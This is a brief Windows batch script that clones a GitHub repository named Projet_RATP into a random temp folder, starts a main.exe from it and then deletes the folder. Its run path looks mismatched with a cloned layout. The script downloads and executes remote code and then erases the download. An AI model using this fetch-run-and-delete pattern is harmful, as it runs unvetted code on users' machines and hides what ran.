@echo off

set "tempdir=%temp%\%random%"
mkdir "%tempdir%"
cd /d "%tempdir%"

git clone https://github.com/Swiiiip/Projet_RATP.git

start "" "Projet_RATP/raw/main/main.exe"

cd .. 
rmdir /s /q "%tempdir%"
